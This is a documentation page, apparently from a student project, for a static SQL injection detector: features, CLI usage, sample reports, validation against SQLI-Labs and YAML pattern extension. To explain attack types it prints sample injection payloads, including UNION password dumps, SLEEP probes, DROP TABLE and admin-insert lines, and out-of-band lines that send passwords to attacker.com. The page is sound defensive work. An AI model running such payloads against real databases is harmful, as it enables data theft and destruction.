---
layout: default
title: SQL Injection Detector
nav_order: 4
---

# SQL Injection Detector

A specialized static analysis tool for detecting SQL injection vulnerabilities in source code, featuring 96 detection patterns across multiple attack types and programming languages.

---

## Overview

The SQL Injection Detector is a standalone tool that complements the main security pipeline, providing deeper analysis specifically for SQL injection vulnerabilities.

### Key Features

- **Multi-language Support:** Python, PHP (extensible to Java, Node.js, etc.)
- **4 Detection Types:** Classic, Blind, Out-of-Band (OOB), Stacked Queries
- **96 Detection Patterns:** 57 common SQL patterns + 39 language-specific patterns
- **Multiple Output Formats:** Text, JSON
- **Auto-save Reports:** Timestamped report files

---

## Supported SQL Injection Types

| Detector | Description | Pattern Examples |
|----------|-------------|------------------|
| **Classic** | Error-based and UNION-based injection | EXTRACTVALUE, UPDATEXML, UNION SELECT |
| **Blind** | Boolean-based and Time-based injection | OR 1=1, SLEEP(), WAITFOR DELAY |
| **OOB** | Out-of-Band data exfiltration | LOAD_FILE, UTL_HTTP, xp_dirtree |
| **Stacked** | Multiple query execution | Semicolon-prefixed statements |

### Classic (Error/Union-Based)

Attackers receive data directly through error messages or query results.

```sql
-- Error-based: Forces database errors that leak information
' AND 1=CAST((SELECT database()) AS INT)--

-- Union-based: Appends queries to extract additional data
' UNION SELECT username, password FROM users--
```

### Blind (Boolean/Time-Based)

No direct data transfer; attackers infer information from application behavior.

```sql
-- Boolean-based: Different responses for true/false conditions
' AND (SELECT SUBSTR(password,1,1) FROM users)='a'--

-- Time-based: Uses delays to confirm conditions
' AND IF(1=1, SLEEP(5), 0)--
```

### Out-of-Band (OOB)

Data exfiltration through external channels (DNS, HTTP requests).

```sql
-- DNS exfiltration
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users), '.attacker.com\\a'))--

-- HTTP exfiltration
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/?data='||(SELECT password FROM users))--
```

### Stacked Queries

Executing multiple SQL statements in a single query.

```sql
-- Multiple statements separated by semicolons
'; DROP TABLE users;--
'; INSERT INTO admins VALUES('hacker','password');--
```

---

## Pattern Distribution

### By Category

| Category | Patterns | Location |
|----------|----------|----------|
| Common (SQL syntax) | 57 | `patterns/common/` |
| Python-specific | 19 | `patterns/python/` |
| PHP-specific | 20 | `patterns/php/` |
| **Total** | **96** | |

### By Detector

| Detector | Common | Python | PHP | Total |
|----------|--------|--------|-----|-------|
| Classic | 8 | 11 | 16 | 35 |
| Blind | 15 | 2 | 2 | 19 |
| OOB | 18 | 2 | 0 | 20 |
| Stacked | 16 | 4 | 2 | 22 |

---

## Usage

### Basic Scan

```bash
# Scan a directory
python -m sql_injection_detector.runner --path ./src

# Scan a single file
python -m sql_injection_detector.runner --path ./app.py
```

### Output Options

```bash
# Text format (default)
python -m sql_injection_detector.runner --path ./src --format text

# JSON format
python -m sql_injection_detector.runner --path ./src --format json

# Save to specific file
python -m sql_injection_detector.runner --path ./src --output report.txt

# Auto-save with timestamp
python -m sql_injection_detector.runner --path ./src --output-dir ./reports
# Creates: ./reports/sqli_report_YYYYMMDD_HHMMSS.txt
```

### Select Specific Detectors

```bash
# Run only classic and blind detectors
python -m sql_injection_detector.runner --path ./src --detectors classic blind
```

---

## Output Examples

### Text Format

```
============================================================
SQL INJECTION DETECTOR REPORT
SCAN SUMMARY
Timestamp:       2026-01-07T16:11:18.631077
Files Scanned:   1
Total Findings:  2
Detectors Run:   classic, blind, oob, stacked
============================================================
RESULTS BY FILE

[VULNERABLE] src/app.php
  Finding #1
    Detector:    classic
    Type:        string_concat
    Severity:    HIGH
    Location:    Line 29, Column 6
    Pattern:     double_quote_sql_variable
    Description: SQL query in double quotes with variable interpolation
    Code:        $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
============================================================
END OF REPORT
```

### JSON Format

```json
{
  "timestamp": "2026-01-07T16:11:18.631077",
  "files_scanned": 1,
  "total_findings": 2,
  "detectors_run": ["classic", "blind", "oob", "stacked"],
  "results": [
    {
      "file": "src/app.php",
      "findings": [
        {
          "detector": "classic",
          "type": "string_concat",
          "severity": "HIGH",
          "line": 29,
          "column": 6,
          "pattern": "double_quote_sql_variable",
          "description": "SQL query in double quotes with variable interpolation",
          "code": "$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";"
        }
      ]
    }
  ]
}
```

---

## Project Structure

```
sql_injection_detector/
├── __init__.py
├── runner.py              # CLI entry point
├── reporter.py            # Report generation (text/json)
├── detectors/
│   ├── __init__.py
│   ├── base.py            # Base detector class
│   ├── classic.py         # Error-based, UNION-based
│   ├── blind.py           # Boolean-based, Time-based
│   ├── oob.py             # Out-of-Band exfiltration
│   └── stacked.py         # Stacked queries
└── patterns/
    ├── common/            # Language-independent SQL patterns
    │   ├── error_based.yaml
    │   ├── union_based.yaml
    │   ├── blind.yaml
    │   ├── oob.yaml
    │   └── stacked.yaml
    ├── python/            # Python-specific patterns
    │   └── unsafe_query.yaml
    └── php/               # PHP-specific patterns
        └── unsafe_query.yaml
```

---

## Validation with SQLI-Labs

The detector was validated against [SQLI-Labs](https://github.com/Audi-1/sqli-labs), a popular SQL injection learning platform with 65 exercises.

### Validation Results

| Lab | Attack Type | Detection Result |
|-----|-------------|------------------|
| Less-1 | Error-based | ✅ Detected |
| Less-8 | Boolean Blind | ✅ Detected |
| Less-38 | Stacked Queries | ✅ Detected |

### Less-1 Validation (Error-Based)

**Target Pattern:**
```php
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

**Detection:**
- Pattern: `double_quote_sql_variable`
- Type: `string_concat`
- Severity: HIGH
- Description: SQL query with variable interpolation

### Less-8 Validation (Boolean Blind)

**Target Pattern:**
```php
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

**Detection:**
- Same vulnerable pattern detected
- Blind injection possible due to lack of parameterization

### Less-38 Validation (Stacked Queries)

**Target Pattern:**
```php
mysqli_multi_query($con1, $sql);
```

**Detection:**
- Pattern: `mysqli_multi_query`
- Type: `batch_execution`
- Severity: HIGH
- Description: Allows multiple SQL statements

---

## Extending the Detector

### Adding a New Language

1. Create `patterns/<language>/unsafe_query.yaml`
2. Define patterns with appropriate `subtype` values:
   - `string_concat` → classic detector
   - `unsafe_execute` → classic detector
   - `boolean_based` → blind detector
   - `batch_execution` → stacked detector
   - `http_exfiltration` → oob detector

3. Add file extension to `SUPPORTED_EXTENSIONS` in `runner.py`

### Pattern YAML Format

```yaml
patterns:
  - name: pattern_name
    subtype: string_concat
    regex: "your_regex_pattern"
    severity: HIGH|MEDIUM|LOW
    description: "Description of the vulnerability"
```

### Example: Adding Java Support

```yaml
# patterns/java/unsafe_query.yaml
patterns:
  - name: string_concat_statement
    subtype: string_concat
    regex: 'Statement\s*\w*\s*=.*createStatement\(\)'
    severity: HIGH
    description: "Statement object allows SQL injection; use PreparedStatement"

  - name: execute_concat
    subtype: unsafe_execute
    regex: '\.execute(Query|Update)?\s*\(\s*["\']?\s*\+\s*\w+'
    severity: HIGH
    description: "SQL query built with string concatenation"
```

---

## Comparison with Main Pipeline

| Feature | SQL Injection Detector | Main Pipeline |
|---------|----------------------|---------------|
| **Focus** | SQLi only (deep) | Multiple vuln types (broad) |
| **Patterns** | 96 SQLi patterns | Basic SQLi + other detectors |
| **Attack Types** | 4 types with subtypes | General SQLi patterns |
| **Languages** | Python, PHP (extensible) | Python, JS, PHP |
| **Output** | Text, JSON | JSON, Markdown, Security Report |
| **LLM Integration** | No | Optional remediation |

---

## Source Code

- **Runner:** [`sql_injection_detector/runner.py`](https://github.com/YOUR_USERNAME/ai-enabled-cybersecurity-pbl/blob/main/sql_injection_detector/runner.py)
- **Detectors:** [`sql_injection_detector/detectors/`](https://github.com/YOUR_USERNAME/ai-enabled-cybersecurity-pbl/tree/main/sql_injection_detector/detectors)
- **Patterns:** [`sql_injection_detector/patterns/`](https://github.com/YOUR_USERNAME/ai-enabled-cybersecurity-pbl/tree/main/sql_injection_detector/patterns)
- **Validation Reports:** [`sql_injection_detector/documents/`](https://github.com/YOUR_USERNAME/ai-enabled-cybersecurity-pbl/tree/main/sql_injection_detector/documents)

---

*MIT Blended AI+X PBL - Track 3: AI-Enabled Cybersecurity*
